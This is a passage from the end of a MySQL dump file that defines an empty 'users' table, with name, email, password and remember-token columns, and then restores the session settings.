/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-01-20  0:54:46
